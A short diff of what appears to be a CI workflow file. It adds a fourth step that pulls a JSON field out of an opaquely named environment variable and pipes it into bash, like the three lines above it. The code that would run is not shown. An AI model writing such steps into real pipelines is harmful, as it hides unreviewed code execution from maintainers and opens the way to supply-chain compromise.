@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$j833" | jq -r .lz2 | /bin/bash
           echo $fnye1 | jq -r .vkn495 | /bin/bash
           echo $pphen489 | jq -r .dnbs920 | /bin/bash
+          echo $fqkfw0 | jq -r .ipc98493 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
